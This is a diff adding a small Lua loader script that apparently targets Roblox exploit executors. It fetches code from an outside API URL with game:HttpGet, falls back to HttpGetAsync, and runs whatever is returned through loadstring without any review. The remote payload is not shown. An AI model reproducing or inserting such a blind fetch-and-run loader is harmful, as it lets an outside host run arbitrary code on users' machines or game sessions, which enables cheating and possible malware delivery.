@@ -1,0 +1,13 @@
+local url = "https://api.junkie-development.de/api/v1/luascripts/public/ac31afb10432393c53e34fcc55214ff360f320bec3ca75060762c4851e031180/download"
+
+local code = game:HttpGet(url, true)
+if code then
+    loadstring(code)()
+else
+    local code2 = game:HttpGetAsync(url, true)
+    if code2 then
+        loadstring(code2)()
+    else
+        print("Failed to load script, maybe executor problem.")
+    end
+end
